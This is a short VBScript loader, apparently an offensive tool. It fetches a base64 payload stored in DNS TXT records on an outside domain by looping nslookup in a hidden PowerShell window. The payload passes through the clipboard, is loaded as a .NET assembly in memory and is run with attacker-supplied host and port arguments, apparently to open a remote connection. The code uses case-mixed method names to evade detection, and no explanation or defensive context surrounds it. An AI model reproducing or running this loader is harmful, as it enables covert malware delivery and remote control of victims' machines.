'''use cscript.exe'''
'WScript.Echo "[+] Downloading Payload"
domain = ".olivierleung.ovh"
arg = "For($i=0;$i -lt 35;$i++){$temp=(nslookup -retry=50 -timeout=1 -q=TXT $i'" & domain & "')[-1];$result=$result+$temp};$result"
PScmd = "powershell -command " & arg & "|clip"
host = WScript.Arguments(0)
port = WScript.Arguments(1)
CreateObject("WScript.Shell").Run PScmd, 0, True

'WScript.Echo "[+] Copy payload to clipboard"

Set objHTML = CreateObject("htmlfile")
output_clipboard = objHTML.ParentWindow.ClipboardData.GetData("text")

output_clipboard = Replace(output_clipboard, Chr(9), vbNullString)
output_clipboard = Replace(output_clipboard, Chr(34), vbNullString)
output_clipboard = Replace(output_clipboard, vbNewLine, vbNullString)
output_clipboard = Replace(output_clipboard, vbCrLf, vbNullString)
output_clipboard = Replace(output_clipboard, " ", "")

'WScript.Echo "[+] Executing payload"

PScmd = "powershell.exe -NoExit -command $b64='" & output_clipboard & "';[String[]]$parameter=@('" & host & "','" & port & "');Write-Host $b64;$bytes=[System.Convert]::FRoMBASe64StRInG($b64);$assembly=[System.Reflection.Assembly]::LoAD($bytes);$assembly.EntryPoint.InVoKE($null,(,$parameter));"
CreateObject("WScript.Shell").Run PScmd
